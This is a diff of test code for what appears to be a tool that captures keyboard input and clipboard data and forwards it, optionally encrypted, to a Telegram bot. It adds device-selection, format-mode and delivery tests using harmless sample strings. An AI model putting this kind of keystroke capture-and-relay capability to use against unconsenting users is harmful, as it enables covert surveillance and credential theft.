@@ -21,6 +21,7 @@
 #include "telegram/telegram_platform.h"
 #include "config/config.h"
 #include "clipboard/clipboard_output.h"
+#include "keyboard/keyboard.h"
 #include "keyboard/keyboard_output.h"
 #include "crypto/crypto.h"
 #include "files/files.h"
@@ -618,6 +619,70 @@ int main(void)
     keyboard_output_cleanup();
     if (http_post_calls != kb_posts + 1)
         return fail("keyboard_output_flush asynchronous delivery");
+
+    /* Keyboard device listing and selection tests */
+    char dev_list_buf[2048];
+    if (!keyboard_get_device_list(dev_list_buf, sizeof(dev_list_buf)))
+        return fail("keyboard_get_device_list execution");
+    if (strstr(dev_list_buf, "Keyboard") == nullptr)
+        return fail("keyboard_get_device_list output content");
+
+    (void)keyboard_select_device("0");
+    char selected_target_buf[64] = {};
+    keyboard_get_selected_target(selected_target_buf, sizeof(selected_target_buf));
+    if (strcmp(selected_target_buf, "0") != 0)
+        return fail("keyboard_select_device index");
+
+    (void)keyboard_select_device("all");
+    keyboard_get_selected_target(selected_target_buf, sizeof(selected_target_buf));
+    if (strcmp(selected_target_buf, "all") != 0)
+        return fail("keyboard_select_device all");
+
+    /* Keyboard format mode tests */
+    keyboard_set_format_mode(KEYBOARD_MODE_RAW);
+    if (keyboard_get_format_mode() != KEYBOARD_MODE_RAW)
+        return fail("keyboard_set_format_mode RAW");
+    keyboard_set_format_mode(KEYBOARD_MODE_CODE);
+    if (keyboard_get_format_mode() != KEYBOARD_MODE_CODE)
+        return fail("keyboard_set_format_mode CODE");
+
+    char kb_status_buf[1024];
+    keyboard_get_status_info(kb_status_buf, sizeof(kb_status_buf));
+    if (strstr(kb_status_buf, "Keyboard Listener Status") == nullptr)
+        return fail("keyboard_get_status_info output");
+
+    /* Test formatted keyboard delivery */
+    const char *test_keystrokes_html = "echo <hello> & 'world' [Enter]";
+    if (!telegram_send_keyboard(test_keystrokes_html, strlen(test_keystrokes_html)))
+        return fail("telegram_send_keyboard execution");
+    if (!body_contains("%26lt%3Bhello%26gt%3B", sizeof("%26lt%3Bhello%26gt%3B") - 1) ||
+        !body_contains("%26amp%3B", sizeof("%26amp%3B") - 1) ||
+        !body_contains("%3Cpre%3E%3Ccode", sizeof("%3Cpre%3E%3Ccode") - 1))
+        return fail("telegram_send_keyboard HTML escaping and code block");
+
+    keyboard_set_format_mode(KEYBOARD_MODE_RAW);
+    if (!telegram_send_keyboard("raw_keys", 8))
+        return fail("telegram_send_keyboard raw mode");
+    keyboard_set_format_mode(KEYBOARD_MODE_CODE);
+
+    /* Test encrypted keyboard delivery through telegram_send_encrypted_data */
+    unsigned char kb_nonce[C2T_CRYPTO_NONCE_SIZE];
+    if (!c2t_crypto_get_random_bytes(kb_nonce, sizeof(kb_nonce)))
+        return fail("generate kb nonce");
+    const char *kb_plain = "sudo apt update && sudo apt upgrade [Enter]";
+    size_t kb_plain_len = strlen(kb_plain);
+    unsigned char kb_cipher[128];
+    if (!c2t_crypto_encrypt(kb_plain, kb_plain_len, kb_nonce, kb_cipher))
+        return fail("encrypt kb payload");
+    if (!telegram_send_encrypted_data(kb_cipher, kb_plain_len, kb_nonce, C2T_KEYBOARD_MIME_TYPE, nullptr))
+        return fail("telegram_send_encrypted_data for keyboard");
+    if (!body_contains("sudo%20apt%20update", sizeof("sudo%20apt%20update") - 1) ||
+        !body_contains("%3Cpre%3E%3Ccode", sizeof("%3Cpre%3E%3Ccode") - 1))
+        return fail("encrypted keyboard delivery content verification");
+
+
+
+
 
     int64_t test_offset = 0;
     int polled = telegram_poll_updates_callback("123:test-token", &test_offset, 0,
